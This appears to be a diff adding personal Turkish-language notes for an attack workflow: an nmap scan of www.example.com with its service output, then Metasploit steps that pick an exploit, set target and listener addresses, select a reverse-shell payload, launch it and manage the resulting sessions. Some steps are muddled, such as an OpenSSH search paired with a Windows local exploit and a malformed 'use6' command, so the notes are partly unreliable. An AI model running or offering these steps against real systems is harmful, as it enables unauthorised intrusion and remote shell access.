@@ -1,0 +1,55 @@
+	RECON
+nmap -sV www.example.com
+
+PORT      STATE  SERVICE    VERSION
+22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
+53/tcp    open   domain     PowerDNS Authoritative Server 4.9.2
+80/tcp    open   http       nginx
+110/tcp   open   pop3       Dovecot pop3d
+143/tcp   open   imap       Dovecot imapd
+443/tcp   open   ssl/http   nginx
+587/tcp   open   smtp       Exim smtpd 4.98
+993/tcp   open   imaps?
+995/tcp   open   pop3s?
+3306/tcp  open   mysql      MariaDB (unauthorized)
+
+firefox > <version_name> exploit
+yapilan aramada varolan exploitleri gosterir.
+
+
+
+	CONNECTION
+  RHOSTS - Hedef ip adresi
+  LHOST  - Kendi ip adresimiz
+
+msfconsole
+
+search OpenSSH 		-> uygun exploitleri gosterir. #6 exploit/windows/local/unquoted_service_path
+use6
+
+set RHOSTS **.**.**.***
+show payloads		-> use payload/generic/shell_reverse_tcp
+
+	       
+set PAYLOAD 72
+
+set LHOST **.**.**.***
+
+exploit		#veya exploit -j -z
+
+
+
+	AFTER CONNECTION
+sessions -l
+sessions 1
+ls
+uname -a	-> Guncel calisan sistemi gosterir.
+pwd
+...
+
+
+ Baska sessiona gecis icin:
+background
+y (yes)
+sessions -l
+sessions x
